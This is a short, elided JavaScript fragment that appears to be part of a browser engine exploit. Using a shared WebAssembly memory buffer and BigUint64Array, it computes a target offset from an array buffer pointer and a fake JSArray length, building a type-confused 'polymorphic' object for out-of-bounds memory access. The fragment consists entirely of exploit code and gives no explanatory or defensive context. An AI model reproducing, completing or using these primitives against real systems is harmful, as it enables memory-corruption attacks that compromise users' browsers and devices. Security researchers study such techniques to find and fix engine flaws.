...
let sab = new WebAssembly.Memory({initial: 0x20, maximum: 0x20, shared: true}).buffer;
let u64s = new BigUint64Array(sab);
u64s[0] = VALUE;
...
// make u64s into a "polymorphic" object of BigUint64Array & JSArray
// set fake jsarray length
let ofs_idx_bi = (TARGET - abptr(u64a.buffer)) / 8n;
let ofs_idx = Number(ofs_idx_bi);
if (BigInt(ofs_idx) != ofs_idx_bi) {
  console.log(`[!] precision loss`);
}
let fake_len = Number((-ofs_idx_bi & ((1n<<64n) - 1n)) + 0x10000n);  // assert HeapNumber
